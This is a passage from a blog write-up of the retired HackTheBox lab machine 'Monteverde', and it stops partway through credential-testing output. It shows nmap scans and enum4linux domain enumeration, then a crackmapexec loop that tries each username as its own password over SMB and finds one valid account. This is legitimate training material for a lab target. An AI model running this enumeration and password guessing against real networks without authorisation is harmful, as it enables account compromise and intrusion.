<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: Monteverde | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2020/06/htb-monteverde.html" title="Read more" class="entry-title-link">
                HTB: Monteverde</a>
        </h1>

        <div class="entry-date">
            <time datetime="2020-06-15T09:00:00+02:00">15 Jun 2020</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/windows.html" title="Read more with the label Windows" class="meta-link">Windows</a> 
          <a href="../../tag/smb.html" title="Read more with the label SMB" class="meta-link">SMB</a> 
          <a href="../../tag/azure.html" title="Read more with the label Azure" class="meta-link">Azure</a> 
          <a href="../../tag/phs.html" title="Read more with the label PHS" class="meta-link">PHS</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 20 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2020.06/monteverde_card.png" alt="Craft card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.eu/home/machines/profile/223">Monteverde</a> published on
January the 11th 2020 by
<a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a>.
This box is classified as a medium machine. The user part is quit direct and
easy and involve to enumerate a few basic services.
The root part was harder for me as it is based on a specific issue with Azure AD
and Password Hash Synchronisation.</p>


<h1 id="user">User</h1>
<h2 id="recon">Recon</h2>
<p>We start with an nmap scan. As often with MS Windows Box a lot of ports are
open.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Sun Jan 12 08:35:35 2020 as: nmap -p- -sS -oN nmap_all 10.10.10.172</span>
<span class="code-line">Nmap scan report for 10.10.10.172</span>
<span class="code-line">Host is up (0.27s latency).</span>
<span class="code-line">Not shown: 65516 filtered ports</span>
<span class="code-line">PORT      STATE SERVICE</span>
<span class="code-line">53/tcp    open  domain</span>
<span class="code-line">88/tcp    open  kerberos-sec</span>
<span class="code-line">135/tcp   open  msrpc</span>
<span class="code-line">139/tcp   open  netbios-ssn</span>
<span class="code-line">389/tcp   open  ldap</span>
<span class="code-line">445/tcp   open  microsoft-ds</span>
<span class="code-line">464/tcp   open  kpasswd5</span>
<span class="code-line">593/tcp   open  http-rpc-epmap</span>
<span class="code-line">636/tcp   open  ldapssl</span>
<span class="code-line">3268/tcp  open  globalcatLDAP</span>
<span class="code-line">3269/tcp  open  globalcatLDAPssl</span>
<span class="code-line">5985/tcp  open  wsman</span>
<span class="code-line">9389/tcp  open  adws</span>
<span class="code-line">49667/tcp open  unknown</span>
<span class="code-line">49669/tcp open  unknown</span>
<span class="code-line">49670/tcp open  unknown</span>
<span class="code-line">49671/tcp open  unknown</span>
<span class="code-line">49699/tcp open  unknown</span>
<span class="code-line">49768/tcp open  unknown</span>
<span class="code-line"></span>
<span class="code-line"># Nmap done at Sun Jan 12 08:47:28 2020 -- 1 IP address (1 host up) scanned in 712.82 seconds</span>
<span class="code-line"></code></pre></div>

<p>We run a service scan on the open ports.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Sun Jan 12 08:58:05 2020 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49699,49768 -sSV -oN nmap_sv 10.10.10.172</span>
<span class="code-line">Nmap scan report for 10.10.10.172</span>
<span class="code-line">Host is up (0.36s latency).</span>
<span class="code-line"></span>
<span class="code-line">PORT      STATE SERVICE       VERSION</span>
<span class="code-line">53/tcp    open  domain?</span>
<span class="code-line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-12 14:07:30Z)</span>
<span class="code-line">135/tcp   open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
<span class="code-line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)</span>
<span class="code-line">445/tcp   open  microsoft-ds?</span>
<span class="code-line">464/tcp   open  kpasswd5?</span>
<span class="code-line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span class="code-line">636/tcp   open  tcpwrapped</span>
<span class="code-line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)</span>
<span class="code-line">3269/tcp  open  tcpwrapped</span>
<span class="code-line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
<span class="code-line">9389/tcp  open  mc-nmf        .NET Message Framing</span>
<span class="code-line">49667/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span class="code-line">49670/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">49671/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">49699/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">49768/tcp open  msrpc         Microsoft Windows RPC</span>
<span class="code-line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
<span class="code-line">SF-Port53-TCP:V=7.80%I=7%D=1/12%Time=5E1B25FA%P=x86_64-pc-linux-gnu%r(DNSV</span>
<span class="code-line">SF:ersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span>
<span class="code-line">SF:x04bind\0\0\x10\0\x03&quot;);</span>
<span class="code-line">Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
<span class="code-line"></span>
<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="code-line"># Nmap done at Sun Jan 12 09:00:45 2020 -- 1 IP address (1 host up) scanned in 159.60 seconds</span>
<span class="code-line"></code></pre></div>

<h2 id="enum4linux">Enum4linux</h2>
<p>We run <a href="https://github.com/portcullislabs/enum4linux">enum4linux</a> on the box.
We get a list of the box username:
 * Guest
 * mhope
 * roleary
 * SABatchJobs
 * smorgan
 * svc-ata
 * svc-bexec
 * svc-netapp</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>perl enum4linux.pl 10.10.10.172</span>
<span class="code-line">WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.</span>
<span class="code-line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 12 09:09:01 2020</span>
<span class="code-line"></span>
<span class="code-line">==========================</span>
<span class="code-line">|    Target Information    |</span>
<span class="code-line">==========================</span>
<span class="code-line">Target ........... 10.10.10.172</span>
<span class="code-line">RID Range ........ 500-550,1000-1050</span>
<span class="code-line">Username ......... &#39;&#39;</span>
<span class="code-line">Password ......... &#39;&#39;</span>
<span class="code-line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">====================================================</span>
<span class="code-line">|    Enumerating Workgroup/Domain on 10.10.10.172    |</span>
<span class="code-line">====================================================</span>
<span class="code-line">[E] Can&#39;t find workgroup/domain</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">============================================</span>
<span class="code-line">|    Nbtstat Information for 10.10.10.172    |</span>
<span class="code-line">============================================</span>
<span class="code-line">Looking up status of 10.10.10.172</span>
<span class="code-line">No reply from 10.10.10.172</span>
<span class="code-line"></span>
<span class="code-line">=====================================</span>
<span class="code-line">|    Session Check on 10.10.10.172    |</span>
<span class="code-line">=====================================</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 437.</span>
<span class="code-line">[+] Server 10.10.10.172 allows sessions using username &#39;&#39;, password &#39;&#39;</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 451.</span>
<span class="code-line">[+] Got domain/workgroup name:</span>
<span class="code-line"></span>
<span class="code-line">===========================================</span>
<span class="code-line">|    Getting domain SID for 10.10.10.172    |</span>
<span class="code-line">===========================================</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 359.</span>
<span class="code-line">Domain Name: MEGABANK</span>
<span class="code-line">Domain Sid: S-1-5-21-391775091-850290835-3566037492</span>
<span class="code-line">[+] Host is part of a domain (not a workgroup)</span>
<span class="code-line"></span>
<span class="code-line">======================================</span>
<span class="code-line">|    OS information on 10.10.10.172    |</span>
<span class="code-line">======================================</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 458.</span>
<span class="code-line">Use of uninitialized value $os_info in concatenation (.) or string at enum4linux.pl line 464.</span>
<span class="code-line">[+] Got OS info for 10.10.10.172 from smbclient:</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 467.</span>
<span class="code-line">[+] Got OS info for 10.10.10.172 from srvinfo:</span>
<span class="code-line">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED</span>
<span class="code-line"></span>
<span class="code-line">=============================</span>
<span class="code-line">|    Users on 10.10.10.172    |</span>
<span class="code-line">=============================</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 866.</span>
<span class="code-line">index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2   Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.</span>
<span class="code-line">index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos   Name: Dimitris Galanos  Desc: (null)</span>
<span class="code-line">index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain</span>
<span class="code-line">index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)</span>
<span class="code-line">index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary    Name: Ray O&#39;Leary   Desc: (null)</span>
<span class="code-line">index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs   Desc: (null)</span>
<span class="code-line">index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan    Name: Sally Morgan  Desc: (null)</span>
<span class="code-line">index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata    Name: svc-ata   Desc: (null)</span>
<span class="code-line">index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec  Name: svc-bexec Desc: (null)</span>
<span class="code-line">index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp Name: svc-netapp    Desc: (null)</span>
<span class="code-line"></span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 883.</span>
<span class="code-line">user:[Guest] rid:[0x1f5]</span>
<span class="code-line">user:[AAD_987d7f2f57d2] rid:[0x450]</span>
<span class="code-line">user:[mhope] rid:[0x641]</span>
<span class="code-line">user:[SABatchJobs] rid:[0xa2a]</span>
<span class="code-line">user:[svc-ata] rid:[0xa2b]</span>
<span class="code-line">user:[svc-bexec] rid:[0xa2c]</span>
<span class="code-line">user:[svc-netapp] rid:[0xa2d]</span>
<span class="code-line">user:[dgalanos] rid:[0xa35]</span>
<span class="code-line">user:[roleary] rid:[0xa36]</span>
<span class="code-line">user:[smorgan] rid:[0xa37]</span>
<span class="code-line"></span>
<span class="code-line">=========================================</span>
<span class="code-line">|    Share Enumeration on 10.10.10.172    |</span>
<span class="code-line">=========================================</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 640.</span>
<span class="code-line"></span>
<span class="code-line">  Sharename       Type      Comment</span>
<span class="code-line">  ---------       ----      -------</span>
<span class="code-line">SMB1 disabled -- no workgroup available</span>
<span class="code-line"></span>
<span class="code-line">[+] Attempting to map shares on 10.10.10.172</span>
<span class="code-line"></span>
<span class="code-line">====================================================</span>
<span class="code-line">|    Password Policy Information for 10.10.10.172    |</span>
<span class="code-line">====================================================</span>
<span class="code-line">[E] Dependent program &quot;polenum.py&quot; not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">==============================</span>
<span class="code-line">|    Groups on 10.10.10.172    |</span>
<span class="code-line">==============================</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 542.</span>
<span class="code-line"></span>
<span class="code-line">[+] Getting builtin groups:</span>
<span class="code-line">group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]</span>
<span class="code-line">group:[Incoming Forest Trust Builders] rid:[0x22d]</span>
<span class="code-line">group:[Windows Authorization Access Group] rid:[0x230]</span>
<span class="code-line">group:[Terminal Server License Servers] rid:[0x231]</span>
<span class="code-line">group:[Users] rid:[0x221]</span>
<span class="code-line">group:[Guests] rid:[0x222]</span>
<span class="code-line">group:[Remote Desktop Users] rid:[0x22b]</span>
<span class="code-line">group:[Network Configuration Operators] rid:[0x22c]</span>
<span class="code-line">group:[Performance Monitor Users] rid:[0x22e]</span>
<span class="code-line">group:[Performance Log Users] rid:[0x22f]</span>
<span class="code-line">group:[Distributed COM Users] rid:[0x232]</span>
<span class="code-line">group:[IIS_IUSRS] rid:[0x238]</span>
<span class="code-line">group:[Cryptographic Operators] rid:[0x239]</span>
<span class="code-line">group:[Event Log Readers] rid:[0x23d]</span>
<span class="code-line">group:[Certificate Service DCOM Access] rid:[0x23e]</span>
<span class="code-line">group:[RDS Remote Access Servers] rid:[0x23f]</span>
<span class="code-line">group:[RDS Endpoint Servers] rid:[0x240]</span>
<span class="code-line">group:[RDS Management Servers] rid:[0x241]</span>
<span class="code-line">group:[Hyper-V Administrators] rid:[0x242]</span>
<span class="code-line">group:[Access Control Assistance Operators] rid:[0x243]</span>
<span class="code-line">group:[Remote Management Users] rid:[0x244]</span>
<span class="code-line">group:[Storage Replica Administrators] rid:[0x246]</span>
<span class="code-line"></span>
<span class="code-line">[+] Getting builtin group memberships:</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Group &#39;IIS_IUSRS&#39; (RID: 568) has member: Couldn&#39;t lookup SIDs</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Group &#39;Windows Authorization Access Group&#39; (RID: 560) has member: Couldn&#39;t lookup SIDs</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Group &#39;Pre-Windows 2000 Compatible Access&#39; (RID: 554) has member: Couldn&#39;t lookup SIDs</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Group &#39;Guests&#39; (RID: 546) has member: Couldn&#39;t lookup SIDs</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Group &#39;Remote Management Users&#39; (RID: 580) has member: Couldn&#39;t lookup SIDs</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Group &#39;Users&#39; (RID: 545) has member: Couldn&#39;t lookup SIDs</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 542.</span>
<span class="code-line"></span>
<span class="code-line">[+] Getting local groups:</span>
<span class="code-line">group:[Cert Publishers] rid:[0x205]</span>
<span class="code-line">group:[RAS and IAS Servers] rid:[0x229]</span>
<span class="code-line">group:[Allowed RODC Password Replication Group] rid:[0x23b]</span>
<span class="code-line">group:[Denied RODC Password Replication Group] rid:[0x23c]</span>
<span class="code-line">group:[DnsAdmins] rid:[0x44d]</span>
<span class="code-line">group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]</span>
<span class="code-line">group:[ADSyncAdmins] rid:[0x451]</span>
<span class="code-line">group:[ADSyncOperators] rid:[0x452]</span>
<span class="code-line">group:[ADSyncBrowse] rid:[0x453]</span>
<span class="code-line">group:[ADSyncPasswordSet] rid:[0x454]</span>
<span class="code-line"></span>
<span class="code-line">[+] Getting local group memberships:</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Group &#39;ADSyncAdmins&#39; (RID: 1105) has member: Couldn&#39;t lookup SIDs</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Group &#39;Denied RODC Password Replication Group&#39; (RID: 572) has member: Couldn&#39;t lookup SIDs</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 574.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 593.</span>
<span class="code-line"></span>
<span class="code-line">[+] Getting domain groups:</span>
<span class="code-line">group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]</span>
<span class="code-line">group:[Domain Users] rid:[0x201]</span>
<span class="code-line">group:[Domain Guests] rid:[0x202]</span>
<span class="code-line">group:[Domain Computers] rid:[0x203]</span>
<span class="code-line">group:[Group Policy Creator Owners] rid:[0x208]</span>
<span class="code-line">group:[Cloneable Domain Controllers] rid:[0x20a]</span>
<span class="code-line">group:[Protected Users] rid:[0x20d]</span>
<span class="code-line">group:[DnsUpdateProxy] rid:[0x44e]</span>
<span class="code-line">group:[Azure Admins] rid:[0xa29]</span>
<span class="code-line">group:[File Server Admins] rid:[0xa2e]</span>
<span class="code-line">group:[Call Recording Admins] rid:[0xa2f]</span>
<span class="code-line">group:[Reception] rid:[0xa30]</span>
<span class="code-line">group:[Operations] rid:[0xa31]</span>
<span class="code-line">group:[Trading] rid:[0xa32]</span>
<span class="code-line">group:[HelpDesk] rid:[0xa33]</span>
<span class="code-line">group:[Developers] rid:[0xa34]</span>
<span class="code-line"></span>
<span class="code-line">[+] Getting domain group memberships:</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\Administrator</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\krbtgt</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\mhope</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\SABatchJobs</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-ata</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-bexec</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\svc-netapp</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\dgalanos</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\roleary</span>
<span class="code-line">Group &#39;Domain Users&#39; (RID: 513) has member: MEGABANK\smorgan</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Group &#39;Operations&#39; (RID: 2609) has member: MEGABANK\smorgan</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Group &#39;Trading&#39; (RID: 2610) has member: MEGABANK\dgalanos</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Group &#39;Domain Guests&#39; (RID: 514) has member: MEGABANK\Guest</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Group &#39;Group Policy Creator Owners&#39; (RID: 520) has member: MEGABANK\Administrator</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\Administrator</span>
<span class="code-line">Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2</span>
<span class="code-line">Group &#39;Azure Admins&#39; (RID: 2601) has member: MEGABANK\mhope</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 614.</span>
<span class="code-line">Group &#39;HelpDesk&#39; (RID: 2611) has member: MEGABANK\roleary</span>
<span class="code-line"></span>
<span class="code-line">=======================================================================</span>
<span class="code-line">|    Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050)    |</span>
<span class="code-line">=======================================================================</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 710.</span>
<span class="code-line">[E] Couldn&#39;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 742.</span>
<span class="code-line"></span>
<span class="code-line">=============================================</span>
<span class="code-line">|    Getting printer info for 10.10.10.172    |</span>
<span class="code-line">=============================================</span>
<span class="code-line">Use of uninitialized value $global_workgroup in concatenation (.) or string at enum4linux.pl line 995.</span>
<span class="code-line">Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">enum4linux complete on Sun Jan 12 09:15:49 2020</span>
<span class="code-line"></code></pre></div>

<h2 id="testing-creds">Testing creds</h2>
<p>We put the usernames in a file <code>users</code> and we test every account for password
equal username on the SMB service.</p>
<p>The account <code>SABatchJobs:SABatchJobs</code> seems to be a valide account.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># while read l; do crackmapexec smb 10.10.10.172 -u $l -p $l --shares; done &lt; users</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\Guest:Guest STATUS_LOGON_FAILURE</span>
<span class="code-line">[*] KTHXBYE!</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE</span>
<span class="code-line">[*] KTHXBYE!</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\mhope:mhope STATUS_LOGON_FAILURE</span>
<span class="code-line">[*] KTHXBYE!</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [+] MEGABANK\SABatchJobs:SABatchJobs</span>
<span class="code-line">[*] KTHXBYE!</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-ata:svc-ata STATUS_LOGON_FAILURE</span>
<span class="code-line">[*] KTHXBYE!</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-bexec:svc-bexec STATUS_LOGON_FAILURE</span>
<span class="code-line">[*] KTHXBYE!</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\svc-netapp:svc-netapp STATUS_LOGON_FAILURE</span>
<span class="code-line">[*] KTHXBYE!</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)</span>
<span class="code-line">CME          10.10.10.172:445 MONTEVERDE      [-] MEGABANK\dgalanos:dgalanos STATUS_LOGON_FAILURE</span>
